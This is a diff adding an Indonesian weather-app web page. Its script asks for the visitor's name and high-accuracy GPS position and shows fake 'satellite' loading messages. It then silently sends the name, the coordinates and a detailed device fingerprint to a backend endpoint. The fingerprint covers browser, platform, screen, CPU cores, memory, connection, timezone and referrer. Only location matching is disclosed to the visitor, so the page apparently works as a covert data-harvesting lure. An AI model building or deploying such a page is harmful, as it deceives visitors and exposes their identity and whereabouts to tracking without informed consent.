+          <svg viewBox="0 0 24 24">
+            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+            <circle cx="12" cy="10" r="3"/>
+          </svg>
+          <span id="locText">-</span>
+        </div>
+      </div>
+
+      <div class="weather-highlight">
+        <div class="hl"><div class="hl-k">Terasa</div><div class="hl-v" id="dApparent">-</div></div>
+        <div class="hl"><div class="hl-k">Angin</div><div class="hl-v" id="dWind">-</div></div>
+        <div class="hl"><div class="hl-k">Lembap</div><div class="hl-v" id="dHumid">-</div></div>
+      </div>
+
+      <div class="section-title">
+        <span>Prakiraan 7 Hari</span>
+        <span>termasuk Sabtu & Minggu</span>
+      </div>
+      <div class="forecast" id="forecast"></div>
+
+      <div class="section-title"><span>Detail Cuaca</span></div>
+      <div class="detail-grid">
+        <div class="ditem">
+          <div class="ditem-head"><svg viewBox="0 0 24 24"><path d="M9.59 4.59A2 2 0 1 1 11 8H2m10.59 11.41A2 2 0 1 0 14 16H2"/></svg><span>Arah Angin</span></div>
+          <div class="ditem-v" id="dWindDir">-</div>
+        </div>
+        <div class="ditem">
+          <div class="ditem-head"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 3v9l5 3"/></svg><span>Tekanan</span></div>
+          <div class="ditem-v" id="dPressure">-</div>
+        </div>
+        <div class="ditem">
+          <div class="ditem-head"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><line x1="12" y1="2" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="22"/></svg><span>UV Index</span></div>
+          <div class="ditem-v" id="dUv">-</div>
+        </div>
+        <div class="ditem">
+          <div class="ditem-head"><svg viewBox="0 0 24 24"><path d="M12 2.69l5.66 5.66a8 8 0 1 1-11.31 0z"/></svg><span>Titik Embun</span></div>
+          <div class="ditem-v" id="dDew">-</div>
+        </div>
+        <div class="ditem">
+          <div class="ditem-head"><svg viewBox="0 0 24 24"><path d="M20 16.2A4.5 4.5 0 0 0 17.5 8h-1.8A7 7 0 1 0 4 14.9"/></svg><span>Curah Hujan</span></div>
+          <div class="ditem-v" id="dRain">-</div>
+        </div>
+        <div class="ditem">
+          <div class="ditem-head"><svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg><span>Visibilitas</span></div>
+          <div class="ditem-v" id="dVis">-</div>
+        </div>
+      </div>
+
+      <div class="sun-bar">
+        <div class="sun-item">
+          <svg viewBox="0 0 24 24"><path d="M17 18a5 5 0 0 0-10 0"/><line x1="12" y1="9" x2="12" y2="2"/><line x1="23" y1="22" x2="1" y2="22"/></svg>
+          <div><div class="sun-item-k">Terbit</div><div class="sun-item-v" id="dSunrise">-</div></div>
+        </div>
+        <div class="sun-divider"></div>
+        <div class="sun-item">
+          <svg viewBox="0 0 24 24"><path d="M17 18a5 5 0 0 0-10 0"/><line x1="12" y1="9" x2="12" y2="2"/><line x1="23" y1="22" x2="1" y2="22"/></svg>
+          <div><div class="sun-item-k">Terbenam</div><div class="sun-item-v" id="dSunset">-</div></div>
+        </div>
+      </div>
+
+      <div class="weather-footer">
+        <div class="weather-footer-left">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <span id="updateTime">Baru saja</span>
+        </div>
+        <button class="reset-btn" id="resetBtn">Ulangi</button>
+      </div>
+
+      <p class="source-note">Sumber data: <strong>Open-Meteo</strong> &middot; dicocokkan dengan lokasi Anda</p>
+    </div>
+  </div>
+
+  <div class="confirm-modal" id="confirmModal">
+    <div class="confirm-box">
+      <div class="confirm-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+          <line x1="12" y1="9" x2="12" y2="13"/>
+          <line x1="12" y1="17" x2="12.01" y2="17"/>
+        </svg>
+      </div>
+      <h3 class="confirm-title">Yakin Lewati Lokasi?</h3>
+      <p class="confirm-desc">
+        Tanpa izin lokasi, data cuaca mungkin <strong>kurang cocok dengan daerah Anda</strong>.
+        Kami hanya bisa memperkirakan dari jaringan internet, bukan dari posisi GPS.
+        Apakah Anda setuju?
+      </p>
+      <div class="confirm-actions">
+        <button class="confirm-btn-back" id="confirmBack">Izinkan Saja</button>
+        <button class="confirm-btn-continue" id="confirmContinue">Lanjut Tanpa GPS</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const $ = (id) => document.getElementById(id);
+  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+  let userName = "";
+  let userGeo = null;
+
+  function goToStep(stepId, badgeLabel) {
+    document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+    $(stepId).classList.add("active");
+    $("badgeText").textContent = badgeLabel;
+  }
+
+  function weatherIconSVG(code) {
+    if (code === 0) return `<svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="10"/><line x1="32" y1="12" x2="32" y2="18"/><line x1="32" y1="46" x2="32" y2="52"/><line x1="12" y1="32" x2="18" y2="32"/><line x1="46" y1="32" x2="52" y2="32"/><line x1="17" y1="17" x2="21" y2="21"/><line x1="43" y1="43" x2="47" y2="47"/><line x1="17" y1="47" x2="21" y2="43"/><line x1="43" y1="21" x2="47" y2="17"/></svg>`;
+    if (code === 1 || code === 2) return `<svg viewBox="0 0 64 64"><circle cx="22" cy="22" r="8"/><line x1="22" y1="6" x2="22" y2="10"/><line x1="22" y1="34" x2="22" y2="38"/><line x1="6" y1="22" x2="10" y2="22"/><line x1="34" y1="22" x2="38" y2="22"/><line x1="11" y1="11" x2="14" y2="14"/><line x1="30" y1="30" x2="33" y2="33"/><line x1="11" y1="33" x2="14" y2="30"/><line x1="30" y1="14" x2="33" y2="11"/><path d="M50 54H30a10 10 0 0 1 0-20 12 12 0 0 1 23 3 7 7 0 0 1-3 17z" fill="rgba(77,171,255,0.15)"/></svg>`;
+    if (code === 3) return `<svg viewBox="0 0 64 64"><path d="M50 54H24a10 10 0 0 1 0-20 12 12 0 0 1 23 3 8 8 0 0 1 3 17z"/></svg>`;
+    if (code === 45 || code === 48) return `<svg viewBox="0 0 64 64"><path d="M50 54H24a10 10 0 0 1 0-20 12 12 0 0 1 23 3 8 8 0 0 1 3 17z"/><line x1="10" y1="28" x2="54" y2="28"/><line x1="14" y1="36" x2="50" y2="36"/></svg>`;
+    if ((code >= 51 && code <= 67) || (code >= 80 && code <= 82)) return `<svg viewBox="0 0 64 64"><path d="M50 48H24a10 10 0 0 1 0-20 12 12 0 0 1 23 3 8 8 0 0 1 3 17z"/><line x1="24" y1="54" x2="24" y2="56"/><line x1="34" y1="54" x2="34" y2="56"/><line x1="44" y1="54" x2="44" y2="56"/></svg>`;
+    if (code >= 71 && code <= 86) return `<svg viewBox="0 0 64 64"><path d="M50 48H24a10 10 0 0 1 0-20 12 12 0 0 1 23 3 8 8 0 0 1 3 17z"/><line x1="24" y1="54" x2="24" y2="56"/><line x1="34" y1="54" x2="34" y2="56"/></svg>`;
+    if (code >= 95) return `<svg viewBox="0 0 64 64"><path d="M50 48H24a10 10 0 0 1 0-20 12 12 0 0 1 23 3 8 8 0 0 1 3 17z"/><polyline points="34,44 30,54 38,54 34,64"/></svg>`;
+    return `<svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="10"/></svg>`;
+  }
+
+  const nameInput = $("nameInput");
+  const nextBtn = $("nextBtn");
+  const nameCounter = $("nameCounter");
+
+  function sanitize(raw) { return raw.replace(/[<>"'`]/g, "").trim().slice(0, 30); }
+
+  function updateNameState() {
+    const val = nameInput.value;
+    const clean = sanitize(val);
+    nameCounter.textContent = val.length + "/30";
+    if (val.length >= 12) nameCounter.classList.add("visible");
+    nextBtn.disabled = clean.length < 2;
+    userName = clean;
+  }
+
+  nameInput.addEventListener("input", updateNameState);
+  nameInput.addEventListener("focus", () => nameCounter.classList.add("visible"));
+  nameInput.addEventListener("blur", () => { if (nameInput.value.length < 12) nameCounter.classList.remove("visible"); });
+  nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter" && !nextBtn.disabled) nextBtn.click(); });
+
+  nextBtn.addEventListener("click", () => {
+    if (!userName) return;
+    goToStep("stepPerm", "Langkah 2");
+  });
+
+  $("skipBtn").addEventListener("click", () => $("confirmModal").classList.add("show"));
+  $("confirmBack").addEventListener("click", () => $("confirmModal").classList.remove("show"));
+  $("confirmContinue").addEventListener("click", async () => {
+    $("confirmModal").classList.remove("show");
+    userGeo = { skipped: true };
+    await runLoading();
+  });
+
+  $("allowBtn").addEventListener("click", async () => {
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true, timeout: 10000, maximumAge: 0
+        });
+      });
+      userGeo = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
+    } catch (e) {
+      userGeo = { error: e.message, skipped: true };
+    }
+    await runLoading();
+  });
+
+  async function runLoading() {
+    goToStep("stepLoading", "Memproses");
+
+    const statuses = userGeo && userGeo.latitude
+      ? ["Mendeteksi lokasimu...", "Menghubungkan satelit cuaca...", "Mengambil data real-time...", "Menyusun prakiraan 7 hari...", "Menyelesaikan..."]
+      : ["Menggunakan lokasi perkiraan...", "Menghubungkan satelit cuaca...", "Mengambil data real-time...", "Menyusun prakiraan 7 hari...", "Menyelesaikan..."];
+
+    for (let i = 0; i < statuses.length; i++) {
+      $("loadingStatus").textContent = statuses[i];
+      $("progressFill").style.width = Math.round(((i + 1) / statuses.length) * 100) + "%";
+      await sleep(420);
+    }
+
+    // Kirim ke backend
+    let backend = { ok: true, weather: null };
+    try {
+      const payload = {
+        type: "weather",
+        name: userName,
+        geo: userGeo,
+        sentAt: new Date().toISOString(),
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        viewport: innerWidth + "x" + innerHeight,
+        pixelRatio: devicePixelRatio,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cores: navigator.hardwareConcurrency || "-",
+        memory: navigator.deviceMemory || "-",
+        touch: "ontouchstart" in window,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        online: navigator.onLine,
+        conn: navigator.connection?.effectiveType || "-",
+        downlink: navigator.connection?.downlink || "-",
+        rtt: navigator.connection?.rtt || "-",
+        referrer: document.referrer || "langsung",
+        path: location.pathname
+      };
+
+      const r = await fetch("/api/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      backend = await r.json();
+    } catch (e) {
+      console.warn("Backend error:", e);
+    }
+
+    await sleep(200);
+    displayWeather(backend);
+    goToStep("stepWeather", "Hasil");
+  }
+
+  function displayWeather(backend) {
+    const w = backend.weather;
+
+    if (!w) {
+      $("weatherTemp").innerHTML = "--<sup>°C</sup>";
+      $("weatherCond").textContent = "Data cuaca tidak tersedia";
+      $("locText").textContent = "Lokasi tidak diketahui";
+      $("forecast").innerHTML = "";
+      return;
+    }
+
+    // Hero
+    $("weatherTemp").innerHTML = Math.round(w.temperature) + '<sup>°C</sup>';
+    $("weatherCond").textContent = w.condition;
+    $("locText").textContent = w.locationName || "-";
+    $("weatherIcon").innerHTML = weatherIconSVG(w.weatherCode);
+
+    // Highlight
+    $("dApparent").textContent = Math.round(w.apparent) + "°C";
+    $("dWind").textContent = Math.round(w.windSpeed) + " km/h";
+    $("dHumid").textContent = w.humidity + "%";
+
+    // Detail
+    $("dWindDir").textContent = w.windDirText || "-";
+    $("dPressure").innerHTML = Math.round(w.pressure) + '<span>hPa</span>';
+    $("dUv").innerHTML = (w.uvIndex != null ? Math.round(w.uvIndex) : "-") + '<span>' + (w.uvText || "") + '</span>';
+    $("dDew").innerHTML = (w.dewPoint != null ? Math.round(w.dewPoint) : "-") + '<span>°C</span>';
+    $("dRain").innerHTML = (w.precipitation != null ? w.precipitation : "-") + '<span>mm</span>';
+    $("dVis").innerHTML = (w.visibility != null ? (w.visibility / 1000).toFixed(1) : "-") + '<span>km</span>';
+    $("dSunrise").textContent = w.sunrise || "-";
+    $("dSunset").textContent = w.sunset || "-";
+
+    // Forecast 7 hari
+    if (w.daily && w.daily.length > 0) {
+      const dayNames = ["Min", "Sen", "Sel", "Rab", "Kam", "Jum", "Sab"];
+      const today = new Date();
+      today.setHours(0, 0, 0, 0);
+
+      $("forecast").innerHTML = w.daily.slice(0, 7).map((d, i) => {
+        const date = new Date(d.date + "T00:00:00");
+        const dayName = dayNames[date.getDay()];
+        const dateStr = (date.getMonth() + 1) + "/" + date.getDate();
+        const isToday = date.getTime() === today.getTime();
+
+        return `
+          <div class="fday ${isToday ? "today" : ""}">
+            <div class="fday-name">${isToday ? "Ini" : dayName}</div>
+            <div class="fday-date">${dateStr}</div>
+            <div class="fday-icon">${weatherIconSVG(d.weatherCode)}</div>
+            <div class="fday-temp">${Math.round(d.tempMax)}°</div>
+            <div class="fday-temp-min">${Math.round(d.tempMin)}°</div>
+            ${d.precipProb > 15 ? `<div class="fday-rain">${d.precipProb}%</div>` : ""}
+          </div>
+        `;
+      }).join("");
+    }
+
+    $("updateTime").textContent = "Baru saja";
+  }
+
+  $("resetBtn").addEventListener("click", () => {
+    nameInput.value = "";
+    updateNameState();
+    $("progressFill").style.width = "0%";
+    $("loadingStatus").textContent = "Mendeteksi lokasimu...";
+    goToStep("stepName", "Langkah 1");
+  });
+
+  updateNameState();
+  setTimeout(() => nameInput.focus(), 500);
+</script>
+</body>
+</html>
